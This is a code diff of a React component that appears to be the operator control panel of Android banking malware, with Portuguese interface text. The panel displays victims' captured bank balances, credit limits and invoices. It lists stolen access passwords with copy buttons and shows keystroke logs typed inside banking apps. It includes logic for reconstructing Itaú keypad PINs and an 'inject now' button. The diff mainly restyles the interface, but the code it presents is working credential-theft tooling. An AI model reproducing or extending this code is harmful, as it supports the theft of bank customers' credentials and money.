+                                  className="px-2 py-1 bg-[#84cc16] hover:bg-purple-700 text-white font-bold rounded text-[10px]"
                                   title="Testar injeção imediatamente"
                                 >
                                   Injetar Agora
@@ -12573,7 +12652,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         {/* Conteúdo Dinmico com Scroll */}
                         <div className="flex-1 overflow-y-auto py-4 space-y-4 pr-1">
                           
-                          {/* ’³ SALDO BANCRIO CAPTURADO */}
+                          {/* ³ SALDO BANCRIO CAPTURADO */}
                           {(() => {
                             const allBals = bankBalances.filter((b: any) => b.package === app.package);
                             const newest = allBals[0];
@@ -12582,8 +12661,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             
                             return (
                               <div className="space-y-4">
-                                {/* 💳 CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
-                                <div className={`relative overflow-hidden rounded-2xl bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
+                                {/*  CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
+                                <div className={`relative overflow-hidden rounded-md bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
                                   {/* Gloss light reflection */}
                                   <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-2xl pointer-events-none -mr-8 -mt-8"></div>
                                   
@@ -12615,9 +12694,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           onClick={() => {
                                             navigator.clipboard.writeText(newest.balance);
-                                            addLog(`📋 Saldo copiado: ${newest.balance}`);
+                                            addLog(` Saldo copiado: ${newest.balance}`);
                                           }}
-                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-lg transition-all flex items-center gap-1"
+                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-md transition-all flex items-center gap-1"
                                         >
                                           Copiar
                                         </button>
@@ -12627,15 +12706,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       {(newest.credit_limit || newest.invoice) && (
                                         <div className="grid grid-cols-2 gap-2 pt-2 border-t border-white/10">
                                           {newest.credit_limit && (
-                                            <div className="bg-black/30 rounded-lg p-2 border border-white/5">
-                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5">💳 Limite Crédito</p>
+                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
+                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Limite Crédito</p>
                                               <div className="flex items-center justify-between">
                                                 <span className="text-xs font-mono font-black text-emerald-400">{newest.credit_limit}</span>
                                                 <button
                                                   onClick={(e) => {
                                                     e.stopPropagation();
                                                     navigator.clipboard.writeText(newest.credit_limit);
-                                                    addLog(`📋 Limite de crédito copiado: ${newest.credit_limit}`);
+                                                    addLog(` Limite de crédito copiado: ${newest.credit_limit}`);
                                                   }}
                                                   className="text-[9px] hover:text-emerald-300 font-bold font-sans text-white/40 ml-1 hover:underline"
                                                 >
@@ -12645,17 +12724,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                             </div>
                                           )}
                                           {newest.invoice && (
-                                            <div className="bg-black/30 rounded-lg p-2 border border-white/5">
-                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5">📄 Fatura Atual</p>
+                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
+                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Fatura Atual</p>
                                               <div className="flex items-center justify-between">
-                                                <span className="text-xs font-mono font-black text-orange-400">{newest.invoice}</span>
+                                                <span className="text-xs font-mono font-black text-[#f87171]">{newest.invoice}</span>
                                                 <button
                                                   onClick={(e) => {
                                                     e.stopPropagation();
                                                     navigator.clipboard.writeText(newest.invoice);
-                                                    addLog(`📋 Fatura copiada: ${newest.invoice}`);
+                                                    addLog(` Fatura copiada: ${newest.invoice}`);
                                                   }}
-                                                  className="text-[9px] hover:text-orange-300 font-bold font-sans text-white/40 ml-1 hover:underline"
+                                                  className="text-[9px] hover:text-[#fca5a5] font-bold font-sans text-white/40 ml-1 hover:underline"
                                                 >
                                                   Copiar
                                                 </button>
@@ -12671,8 +12750,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       </div>
                                     </div>
                                   ) : (
-                                    <div className="text-center py-8 bg-black/30 rounded-xl border border-dashed border-white/10">
-                                      <span className="text-3xl block mb-2 animate-pulse">💤</span>
+                                    <div className="text-center py-8 bg-black/30 rounded-md border border-dashed border-white/10">
+                                      <span className="text-3xl block mb-2 animate-pulse"></span>
                                       <p className="font-bold text-white text-xs mb-1">Aguardando captura automática</p>
                                       <p className="text-[10px] text-white/40 max-w-[200px] mx-auto">
                                         O saldo será capturado automaticamente assim que a tela inicial deste banco for aberta no dispositivo.
@@ -12681,18 +12760,18 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   )}
                                 </div>
 
-                                {/* 📜 HISTÓRICO DE CAPTURAS */}
+                                {/*  HISTÓRICO DE CAPTURAS */}
                                 {allBals.length > 1 && (
-                                  <div className="bg-gradient-to-br from-slate-900/60 to-slate-950/80 border border-slate-800 rounded-xl p-4">
+                                  <div className="bg-gradient-to-br from-[#121214]/60 to-slate-950/80 border border-[#24242a] rounded-md p-4">
                                     <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                                       <span>Histórico de Alterações</span>
-                                      <span className="text-[10px] text-slate-600 normal-case font-normal">{allBals.length} registros</span>
+                                      <span className="text-[10px] text-[#6f6f78] normal-case font-normal">{allBals.length} registros</span>
                                     </h4>
                                     <div className="space-y-1.5 max-h-36 overflow-y-auto pr-1">
                                       {allBals.slice(1).map((b: any, i: number) => (
-                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-lg px-3 py-2 border border-slate-900 hover:border-slate-800 transition-colors">
+                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-md px-3 py-2 border border-[#121214] hover:border-[#24242a] transition-colors">
                                           <span className="font-mono text-xs text-slate-300 font-bold">{b.balance}</span>
-                                          <span className="text-[9px] text-slate-500 font-mono">
+                                          <span className="text-[9px] text-[#8b8b94] font-mono">
                                             {new Date(b.timestamp).toLocaleString('pt-BR')}
                                           </span>
                                         </div>
@@ -12704,25 +12783,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             );
                           })()}
 
-                          {/* ” SENHAS DE ACESSO CAPTURADAS */}
-                          <div className="bg-gradient-to-br from-orange-950/30 to-slate-900/60 rounded-xl p-4 border border-orange-500/20">
-                            <h3 className="text-xs font-black uppercase text-orange-400 tracking-wider mb-3">
-                              ” Senhas de Acesso ({appPasswords.length})
+                          {/*  SENHAS DE ACESSO CAPTURADAS */}
+                          <div className="bg-gradient-to-br from-orange-950/30 to-[#121214]/60 rounded-md p-4 border border-[#ef4444]/20">
+                            <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider mb-3">
+                               Senhas de Acesso ({appPasswords.length})
                             </h3>
                             
                             {appPasswords.length === 0 ? (
-                              <div className="text-center py-6 text-slate-500 text-xs bg-black/20 rounded-lg">
-                                — Nenhuma senha de acesso capturada ainda.
+                              <div className="text-center py-6 text-[#8b8b94] text-xs bg-black/20 rounded-md">
+                                 Nenhuma senha de acesso capturada ainda.
                               </div>
                             ) : (
                               <div className="space-y-3">
                                 {appPasswords.map((pwd, i) => (
-                                  <div key={i} className="bg-slate-950/70 border border-slate-800 rounded-lg p-3">
+                                  <div key={i} className="bg-slate-950/70 border border-[#24242a] rounded-md p-3">
                                     <div className="flex items-center justify-between mb-2">
-                                      <span className="px-2 py-0.5 bg-orange-950 text-orange-400 text-[10px] rounded font-mono font-bold">
+                                      <span className="px-2 py-0.5 bg-orange-950 text-[#f87171] text-[10px] rounded font-mono font-bold">
                                         {pwd.label || pwd.hint || 'SENHA'}
                                       </span>
-                                      <span className="text-[10px] text-slate-500">
+                                      <span className="text-[10px] text-[#8b8b94]">
                                         {new Date(pwd.timestamp).toLocaleString()}
                                       </span>
                                     </div>
@@ -12733,9 +12812,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         onClick={() => {
                                           navigator.clipboard.writeText(pwd.password);
-                                          addLog(`📋 Senha copiada: ${pwd.password}`);
+                                          addLog(` Senha copiada: ${pwd.password}`);
                                         }}
-                                        className="px-3 py-1.5 bg-slate-850 hover:bg-slate-700 text-white text-xs font-semibold rounded transition-colors"
+                                        className="px-3 py-1.5 bg-slate-850 hover:bg-[#2a2a31] text-white text-xs font-semibold rounded transition-colors"
                                       >
                                         Copiar
                                       </button>
@@ -12747,16 +12826,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           </div>
 
 {/* ¨ KEYLOGS DENTRO DO BANCO */}
-                          <div className="bg-gradient-to-br from-slate-900 to-slate-950/60 rounded-2xl p-4 border border-slate-800/80 shadow-2xl relative overflow-hidden">
+                          <div className="bg-gradient-to-br from-[#121214] to-slate-950/60 rounded-md p-4 border border-[#24242a]/80 shadow-2xl relative overflow-hidden">
                             {/* Efeito de brilho neon no fundo */}
-                            <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 blur-3xl rounded-full pointer-events-none"></div>
+                            <div className="absolute top-0 right-0 w-24 h-24 bg-[#ef4444]/5 blur-3xl rounded-full pointer-events-none"></div>
                             
                             <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 mb-4">
                               <div>
                                 <h3 className="text-xs font-black uppercase text-slate-300 tracking-wider flex items-center gap-2">
                                   <span className="relative flex h-2 w-2">
-                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
-                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-cyan-500"></span>
+                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#ef4444] opacity-75"></span>
+                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#ef4444]"></span>
                                   </span>
                                   ¨ Teclas Digitadas neste App ({appKeylogs.length})
                                 </h3>
@@ -12770,21 +12849,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   placeholder="Buscar nas teclas..."
                                   value={bankKeylogSearch}
                                   onChange={(e) => setBankKeylogSearch(e.target.value)}
-                                  className="w-full text-xs bg-slate-950/85 border border-slate-800 rounded-lg px-2.5 py-1.5 pl-7 text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 transition-all font-mono"
+                                  className="w-full text-xs bg-slate-950/85 border border-[#24242a] rounded-md px-2.5 py-1.5 pl-7 text-slate-200 placeholder-[#6f6f78] focus:outline-none focus:border-[#2a2a31]/50 transition-all font-mono"
                                 />
-                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-slate-600 text-xs">”</span>
+                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[#6f6f78] text-xs"></span>
                               </div>
                             </div>
 
                             {/* Mini Stats Banner */}
                             {appKeylogs.length > 0 && (
-                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-lg border border-slate-900/50">
-                                <div className="text-center border-r border-slate-900">
-                                  <span className="block text-[9px] text-slate-500 font-bold uppercase tracking-wider">Total de Logs</span>
-                                  <span className="text-xs font-bold text-cyan-400 font-mono">{appKeylogs.length}</span>
+                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-md border border-[#121214]/50">
+                                <div className="text-center border-r border-[#121214]">
+                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Total de Logs</span>
+                                  <span className="text-xs font-bold text-[#ef4444] font-mono">{appKeylogs.length}</span>
                                 </div>
                                 <div className="text-center">
-                                  <span className="block text-[9px] text-slate-500 font-bold uppercase tracking-wider">Última Atividade</span>
+                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Última Atividade</span>
                                   <span className="text-xs font-bold text-green-400 font-mono">
                                     {(() => {
                                       const lastLog = [...appKeylogs].sort((a, b) => 
@@ -12800,13 +12879,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                             {appKeylogs.length === 0 ? (
                               isLoadingBankKeylogs ? (
-                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-xl border border-slate-900/50 flex flex-col items-center justify-center gap-2">
+                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                   <span className="animate-spin text-2xl">³</span>
                                   <span>Carregando teclas do banco...</span>
                                 </div>
                               ) : (
-                                <div className="text-center py-8 text-slate-500 text-xs bg-slate-950/40 rounded-xl border border-slate-900/50 flex flex-col items-center justify-center gap-2">
-                                  <span className="text-2xl">💤</span>
+                                <div className="text-center py-8 text-[#8b8b94] text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
+                                  <span className="text-2xl"></span>
                                   <span>Nenhuma tecla capturada dentro do app ainda.</span>
                                 </div>
                               )
@@ -12839,13 +12918,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || eventType === 'VIEW_CLICKED') {
                                     if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                                       const cleanText = textVal.replace(/^"|"$/g, '');
-                                      return `👆 Botão Clicado: "${cleanText}"`;
+                                      return ` Botão Clicado: "${cleanText}"`;
                                     } else if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                       const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                       const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
-                                      return `👆 Toque em Elemento da Tela${posInfo}`;
+                                      return ` Toque em Elemento da Tela${posInfo}`;
                                     }
-                                    return `👆 Clique / Toque no Banco`;
+                                    return ` Clique / Toque no Banco`;
                                   }
 
                                   // 2. Dígito ou PIN de Senha Bancária
@@ -12862,28 +12941,28 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     const cleanLower = cleanNum.toLowerCase();
                                     if (cleanNum && cleanLower !== 'ispassword' && cleanLower !== 'true' && cleanLower !== 'false' && cleanLower !== 'null' && cleanLower !== 'undefined') {
                                       if (eventType === 'BANK_PASSWORD_COMPLETE') {
-                                        return `🔑 Senha Compilada: [ ${cleanNum} ]`;
+                                        return ` Senha Compilada: [ ${cleanNum} ]`;
                                       }
-                                      return `🔑 Teclado / Dígito: [ ${cleanNum} ]`;
+                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                     }
                                     const label = hint || fieldName || (l && (l.appName || l.bank)) || '';
-                                    return label ? `🔑 Digitando Senha em (${label})` : `🔑 Senha sendo digitada...`;
+                                    return label ? ` Digitando Senha em (${label})` : ` Senha sendo digitada...`;
                                   }
 
                                   // 3. Posição de toque na tela por texto
                                   if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                     const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                     const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
-                                    return `👆 Toque na Tela${posInfo}`;
+                                    return ` Toque na Tela${posInfo}`;
                                   }
 
                                   // 4. Se for número isolado (ex: 86, 8, [86], [8])
                                   if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                     const cleanNum = textVal.replace(/[\[\]]/g, '');
                                     if (l.isPassword) {
-                                      return `🔑 Teclado / Dígito: [ ${cleanNum} ]`;
+                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                     }
-                                    return `👆 Botão / Dígito Clicado: [ ${cleanNum} ]`;
+                                    return ` Botão / Dígito Clicado: [ ${cleanNum} ]`;
                                   }
 
                                   // 5. Alteração / Digitação de Texto
@@ -12919,12 +12998,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   if (hint && fieldName) {
                                     return `· [${fieldName}] ${hint}`;
                                   } else if (hint) {
-                                    return `💡 Contexto: ${hint}`;
+                                    return ` Contexto: ${hint}`;
                                   } else if (fieldName) {
-                                    return `📌 Campo focado: ${fieldName}`;
+                                    return ` Campo focado: ${fieldName}`;
                                   }
 
-                                  return `🏦 Interação no Banco`;
+                                  return ` Interação no Banco`;
                                 };
 
                                 const getLogCategory = (l: any) => {
@@ -12950,7 +13029,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   }
 
                                   // Cliques por texto ou posição
-                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('👆') || eventType.includes('CLICK')) {
+                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('') || eventType.includes('CLICK')) {
                                     return 'click';
                                   }
 
@@ -13004,10 +13083,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('all')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'all'
-                                              ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
                                           Œ Todos ({appKeylogs.length})
@@ -13015,38 +13094,38 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('password')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'password'
-                                              ? 'bg-rose-500/20 text-rose-300 border-rose-500/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
-                                          🔑 Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
+                                           Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                         </button>
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('click')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'click'
-                                              ? 'bg-purple-500/20 text-purple-300 border-purple-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
-                                          👆 Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
+                                           Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                         </button>
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('screen')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'screen'
-                                              ? 'bg-blue-500/20 text-blue-300 border-blue-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
                                            Telas ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                         </button>
                                       </div>
-                                      <div className="text-center py-6 text-slate-600 text-xs font-mono">
+                                      <div className="text-center py-6 text-[#6f6f78] text-xs font-mono">
                                         Nenhum resultado para os filtros selecionados
                                       </div>
                                     </div>
@@ -13085,10 +13164,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('all')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'all'
-                                            ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                         Œ Todos ({appKeylogs.length})
@@ -13096,32 +13175,32 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('password')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'password'
-                                            ? 'bg-rose-500/20 text-rose-300 border-rose-500/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
-                                        🔑 Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
+                                         Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                       </button>
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('click')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'click'
-                                            ? 'bg-purple-500/20 text-purple-300 border-purple-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
-                                        👆 Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
+                                         Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                       </button>
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('screen')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'screen'
-                                            ? 'bg-blue-500/20 text-blue-300 border-blue-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                          Telas Aberta ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
@@ -13129,24 +13208,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('text')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'text'
                                             ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/50 shadow-[0_0_8px_rgba(16,185,129,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                         ¨ Textos ({appKeylogs.filter(l => getLogCategory(l) === 'text').length})
                                       </button>
                                     </div>
 
-                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-slate-800/60">
+                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-[#24242a]/60">
                                       {Object.keys(groups).map((day, groupIdx) => (
                                         <div key={groupIdx} className="space-y-2 relative">
                                           {/* Badge de Data com Copiar Tudo */}
                                           <div className="flex items-center justify-between my-2 relative -left-4">
-                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-slate-800 shadow-md">
-                                              <span className="text-[10px]">📅</span>
-                                              <span className="text-[9px] font-black font-mono text-cyan-400 uppercase tracking-wide">
+                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-[#24242a] shadow-md">
+                                              <span className="text-[10px]"></span>
+                                              <span className="text-[9px] font-black font-mono text-[#ef4444] uppercase tracking-wide">
                                                 {day}
                                               </span>
                                             </div>
@@ -13157,9 +13236,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                   return `[${time}] ${getBankLogDisplay(l)}`;
                                                 }).join('\n');
                                                 navigator.clipboard.writeText(textToCopy);
-                                                addLog(`📋 Copiado todos os logs de ${day}`);
+                                                addLog(` Copiado todos os logs de ${day}`);
                                               }}
-                                              className="text-[8px] font-bold text-slate-500 hover:text-cyan-400 bg-slate-950/40 hover:bg-cyan-950/20 px-2 py-0.5 rounded border border-slate-900 hover:border-cyan-800/40 transition-all font-mono"
+                                              className="text-[8px] font-bold text-[#8b8b94] hover:text-[#ef4444] bg-slate-950/40 hover:bg-[#121214]/20 px-2 py-0.5 rounded border border-[#121214] hover:border-[#24242a]/40 transition-all font-mono"
                                             >
                                               Copiar Dia
                                             </button>
@@ -13177,7 +13256,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                               const isScreen = category === 'screen';
                                               const isText = category === 'text';
 
-                                              // Verifica se parece um PIN ou senha do🏦 Itaú
+                                              // Verifica se parece um PIN ou senha do Itaú
                                               const isItauKeypad = /(\d)\s*(?:ou|\|)\s*(\d)/i.test(logText);
                                               let itauPairs: [string, string][] = [];
                                               let itauPermutations: string[] = [];
@@ -13201,47 +13280,47 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                               return (
                                                 <div 
                                                   key={log.id || logIdx} 
-                                                  className={`group flex items-start gap-2.5 p-2 rounded-xl transition-all border ${
+                                                  className={`group flex items-start gap-2.5 p-2 rounded-md transition-all border ${
                                                     isPass 
-                                                      ? 'bg-rose-950/20 border-rose-900/50 hover:border-rose-500/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
+                                                      ? 'bg-rose-950/20 border-[#1a1a1e]/50 hover:border-[#ef4444]/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
                                                       : isClick 
-                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-purple-500/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
+                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-[#f87171]/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                                                         : isScreen 
-                                                          ? 'bg-cyan-950/15 border-cyan-900/40 hover:border-cyan-500/40'
-                                                          : 'bg-[#200703]/40 border-slate-900/50 hover:border-slate-800/60'
+                                                          ? 'bg-[#121214]/15 border-[#1a1a1e]/40 hover:border-[#2a2a31]/40'
+                                                          : 'bg-[#200703]/40 border-[#121214]/50 hover:border-[#24242a]/60'
                                                   }`}
                                                 >
                                                   {/* Indicador de linha do tempo */}
                                                   <div className="flex flex-col items-center flex-shrink-0 pt-1 relative -left-[18px]">
